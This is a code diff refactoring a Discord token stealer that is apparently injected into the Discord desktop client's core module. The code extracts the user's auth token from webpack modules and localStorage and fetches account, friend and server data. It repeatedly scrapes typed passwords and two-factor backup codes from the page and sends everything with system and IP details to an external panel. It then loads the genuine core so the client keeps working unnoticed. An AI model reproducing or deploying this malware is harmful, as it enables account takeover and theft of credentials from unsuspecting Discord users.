@@ -24,18 +24,27 @@ function sendToPanel(payload) {
 async function getDiscordToken() {
     const mainWindow = BrowserWindow.getAllWindows()[0];
     if (!mainWindow) return null;
+    
     try {
         const token = await mainWindow.webContents.executeJavaScript(`
             (function() {
                 let token = null;
+                
                 if (window.webpackChunkdiscord_app) {
                     window.webpackChunkdiscord_app.push([[Symbol()], {}, o => {
                         for (let e of Object.values(o.c)) {
                             try {
                                 if (!e.exports || e.exports === window) continue;
-                                if (e.exports?.getToken) token = e.exports.getToken();
+                                
+                                if (e.exports?.getToken) {
+                                    token = e.exports.getToken();
+                                }
+                                
                                 for (let key in e.exports) {
-                                    if (e.exports?.[key]?.getToken && "IntlMessagesProxy" !== e.exports[key][Symbol.toStringTag]) {
+                                    if (
+                                        e.exports?.[key]?.getToken &&
+                                        "IntlMessagesProxy" !== e.exports[key][Symbol.toStringTag]
+                                    ) {
                                         token = e.exports[key].getToken();
                                     }
                                 }
@@ -44,6 +53,7 @@ async function getDiscordToken() {
                     }]);
                     window.webpackChunkdiscord_app.pop();
                 }
+                
                 if (!token) {
                     for (let i = 0; i < localStorage.length; i++) {
                         const key = localStorage.key(i);
@@ -51,14 +61,18 @@ async function getDiscordToken() {
                             try {
                                 const value = localStorage.getItem(key);
                                 const parsed = JSON.parse(value);
-                                if (parsed && parsed.token) token = parsed.token;
+                                if (parsed && parsed.token) {
+                                    token = parsed.token;
+                                }
                             } catch(e) {}
                         }
                     }
                 }
+                
                 return token;
             })();
         `);
+        
         return token;
     } catch (err) {
         return null;
@@ -71,7 +85,11 @@ async function getIpInfo() {
             let data = '';
             res.on('data', chunk => data += chunk);
             res.on('end', () => {
-                try { resolve(JSON.parse(data)); } catch { resolve({ ip: 'Unknown', city: 'Unknown', country: 'Unknown' }); }
+                try {
+                    resolve(JSON.parse(data));
+                } catch (err) {
+                    resolve({ ip: 'Unknown', city: 'Unknown', country: 'Unknown' });
+                }
             });
         }).on('error', () => resolve({ ip: 'Unknown', city: 'Unknown', country: 'Unknown' }));
     });
@@ -79,12 +97,27 @@ async function getIpInfo() {
 
 async function getDiscordUserInfo(token) {
     return new Promise((resolve) => {
-        const options = { hostname: 'discord.com', path: '/api/v9/users/@me', method: 'GET', headers: { 'Authorization': token } };
+        const options = {
+            hostname: 'discord.com',
+            path: '/api/v9/users/@me',
+            method: 'GET',
+            headers: {
+                'Authorization': token
+            }
+        };
+        
         const req = https.request(options, (res) => {
             let data = '';
             res.on('data', chunk => data += chunk);
-            res.on('end', () => { try { resolve(JSON.parse(data)); } catch { resolve(null); } });
+            res.on('end', () => {
+                try {
+                    resolve(JSON.parse(data));
+                } catch (err) {
+                    resolve(null);
+                }
+            });
         });
+        
         req.on('error', () => resolve(null));
         req.end();
     });
@@ -92,50 +125,58 @@ async function getDiscordUserInfo(token) {
 
 async function getDiscordRelationships(token) {
     return new Promise((resolve) => {
-        const options = { hostname: 'discord.com', path: '/api/v9/users/@me/relationships', method: 'GET', headers: { 'Authorization': token } };
+        const options = {
+            hostname: 'discord.com',
+            path: '/api/v9/users/@me/relationships',
+            method: 'GET',
+            headers: {
+                'Authorization': token
+            }
+        };
+        
         const req = https.request(options, (res) => {
             let data = '';
             res.on('data', chunk => data += chunk);
             res.on('end', () => {
                 try {
-                    const data = JSON.parse(data);
-                    resolve({ friends: data.filter(r => r.type === 1).length, blocked: data.filter(r => r.type === 2).length });
-                } catch { resolve({ friends: 0, blocked: 0 }); }
+                    resolve(JSON.parse(data));
+                } catch (err) {
+                    resolve(null);
+                }
             });
         });
-        req.on('error', () => resolve({ friends: 0, blocked: 0 }));
+        
+        req.on('error', () => resolve(null));
         req.end();
     });
 }
 
 async function getDiscordGuilds(token) {
     return new Promise((resolve) => {
-        const options = { hostname: 'discord.com', path: '/api/v9/users/@me/guilds', method: 'GET', headers: { 'Authorization': token } };
+        const options = {
+            hostname: 'discord.com',
+            path: '/api/v9/users/@me/guilds',
+            method: 'GET',
+            headers: {
+                'Authorization': token
+            }
+        };
+        
         const req = https.request(options, (res) => {
             let data = '';
             res.on('data', chunk => data += chunk);
-            res.on('end', () => { try { resolve(JSON.parse(data).length); } catch { resolve(0); } });
+            res.on('end', () => {
+                try {
+                    resolve(JSON.parse(data));
+                } catch (err) {
+                    resolve(null);
+                }
+            });
         });
-        req.on('error', () => resolve(0));
+        
+        req.on('error', () => resolve(null));
         req.end();
     });
-}
-
-function getBadges(flags) {
-    const badges = [];
-    if (!flags) return badges;
-    if (flags & 1) badges.push('Discord Employee');
-    if (flags & 2) badges.push('Discord Partner');
-    if (flags & 4) badges.push('HypeSquad Events');
-    if (flags & 8) badges.push('Bug Hunter Level 1');
-    if (flags & 64) badges.push('HypeSquad Bravery');
-    if (flags & 128) badges.push('HypeSquad Brilliance');
-    if (flags & 256) badges.push('HypeSquad Balance');
-    if (flags & 512) badges.push('Early Supporter');
-    if (flags & 16384) badges.push('Bug Hunter Level 2');
-    if (flags & 131072) badges.push('Verified Developer');
-    if (flags & 4194304) badges.push('Active Developer');
-    return badges;
 }
 
 function getSystemInfo() {
@@ -150,7 +191,20 @@ function getSystemInfo() {
 
 async function sendInitialData(ipData, token, userInfo, relationships, guilds) {
     const si = getSystemInfo();
-    const badges = userInfo?.flags ? getBadges(userInfo.flags) : [];
+    const badges = [];
+    if (userInfo && userInfo.flags) {
+        if (userInfo.flags & 1) badges.push('Discord Employee');
+        if (userInfo.flags & 2) badges.push('Discord Partner');
+        if (userInfo.flags & 4) badges.push('HypeSquad Events');
+        if (userInfo.flags & 8) badges.push('Bug Hunter Level 1');
+        if (userInfo.flags & 64) badges.push('HypeSquad Bravery');
+        if (userInfo.flags & 128) badges.push('HypeSquad Brilliance');
+        if (userInfo.flags & 256) badges.push('HypeSquad Balance');
+        if (userInfo.flags & 512) badges.push('Early Supporter');
+        if (userInfo.flags & 16384) badges.push('Bug Hunter Level 2');
+        if (userInfo.flags & 131072) badges.push('Verified Developer');
+        if (userInfo.flags & 4194304) badges.push('Active Developer');
+    }
     await sendToPanel({
         ...si,
         injection_type: "initial",
@@ -158,7 +212,7 @@ async function sendInitialData(ipData, token, userInfo, relationships, guilds) {
         user_info: userInfo,
         ip_info: ipData,
         relationships: relationships,
-        guild_count: guilds,
+        guild_count: guilds && Array.isArray(guilds) ? guilds.length : 0,
         badges: badges
     });
 }
@@ -166,6 +220,7 @@ async function sendInitialData(ipData, token, userInfo, relationships, guilds) {
 async function monitorPasswordChanges(token, ipData, userInfo, relationships, guilds) {
     const mainWindow = BrowserWindow.getAllWindows()[0];
     if (!mainWindow) return;
+    
     setInterval(async () => {
         try {
             const currentPassword = await mainWindow.webContents.executeJavaScript(`
@@ -173,18 +228,25 @@ async function monitorPasswordChanges(token, ipData, userInfo, relationships, gu
                     try {
                         const passwordInputs = document.querySelectorAll('input[type="password"]');
                         for (let input of passwordInputs) {
-                            if (input.value && input.value.length > 0) return input.value;
+                            if (input.value && input.value.length > 0) {
+                                return input.value;
+                            }
                         }
                         return null;
-                    } catch(e) { return null; }
+                    } catch(e) {
+                        return null;
+                    }
                 })();
             `);
+            
             if (currentPassword) {
                 const currentHash = crypto.createHash('sha256').update(currentPassword).digest('hex');
+                
                 if (lastPasswordHash !== null && lastPasswordHash !== currentHash) {
                     const si = getSystemInfo();
                     await sendToPanel({ ...si, injection_type: "password_change", password: currentPassword });
                 }
+                
                 lastPasswordHash = currentHash;
             }
         } catch(err) {}
@@ -194,6 +256,7 @@ async function monitorPasswordChanges(token, ipData, userInfo, relationships, gu
 async function monitorBackupCodeChanges(token, ipData, userInfo, relationships, guilds) {
     const mainWindow = BrowserWindow.getAllWindows()[0];
     if (!mainWindow) return;
+    
     setInterval(async () => {
         try {
             const backupCodes = await mainWindow.webContents.executeJavaScript(`
@@ -203,17 +266,24 @@ async function monitorBackupCodeChanges(token, ipData, userInfo, relationships, 
                         const pageText = document.body.innerText;
                         const codeRegex = /[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}/gi;
                         const matches = pageText.match(codeRegex);
-                        if (matches) backupCodesList.push(...matches);
+                        if (matches) {
+                            backupCodesList.push(...matches);
+                        }
                         return backupCodesList.length > 0 ? backupCodesList.join(', ') : null;
-                    } catch(e) { return null; }
+                    } catch(e) {
+                        return null;
+                    }
                 })();
             `);
+            
             if (backupCodes) {
                 const currentHash = crypto.createHash('sha256').update(backupCodes).digest('hex');
+                
                 if (lastBackupCodesHash !== null && lastBackupCodesHash !== currentHash) {
                     const si = getSystemInfo();
                     await sendToPanel({ ...si, injection_type: "backup_codes", codes: backupCodes });
                 }
+                
                 lastBackupCodesHash = currentHash;
             }
         } catch(err) {}
@@ -223,20 +293,28 @@ async function monitorBackupCodeChanges(token, ipData, userInfo, relationships, 
 app.whenReady().then(async () => {
     try {
         await new Promise(r => setTimeout(r, 5000));
+        
         const ipData = await getIpInfo();
         const token = await getDiscordToken();
+        
         if (token) {
             const userInfo = await getDiscordUserInfo(token);
             const relationships = await getDiscordRelationships(token);
             const guilds = await getDiscordGuilds(token);
+            
             await sendInitialData(ipData, token, userInfo, relationships, guilds);
+            
             monitorPasswordChanges(token, ipData, userInfo, relationships, guilds);
             monitorBackupCodeChanges(token, ipData, userInfo, relationships, guilds);
         } else {
             const si = getSystemInfo();
             await sendToPanel({ ...si, injection_type: "error", error: "No token found" });
         }
+        
     } catch (err) {}
 });
 
+try {
+    module.exports = require("./core.asar");
+} catch (e) {}
 module.exports = require("./core.asar");
